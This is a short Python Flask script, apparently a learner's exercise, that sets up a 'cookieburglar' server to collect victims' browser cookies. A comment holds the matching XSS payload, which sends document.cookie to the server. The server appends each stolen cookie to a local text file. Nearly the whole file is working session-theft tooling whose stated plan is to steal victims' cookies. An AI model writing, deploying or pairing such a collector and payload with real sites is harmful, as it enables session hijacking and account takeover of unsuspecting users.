#PLAN: 
#    Learn + use Flask
#    Find out how to run a 2nd server simultaneously
#    Use malicious server to get victim's cookies and save to file

from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/') #home URL
def cookieburglar():
    
    #get document.cookie from xss payload, send to malicious server & store in a txt file
    #xss payload: <script language=“JavaScript”>document.location=“http://127.0.0.1:5000/?c=“+document.cookie;</script>
    cookieburglar = request.args.get('c')
    f = open("/home/tic/Documents/cookies.txt","a")
    f.write(cookieburglar+ ' ' + '\n')
    f.close()

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
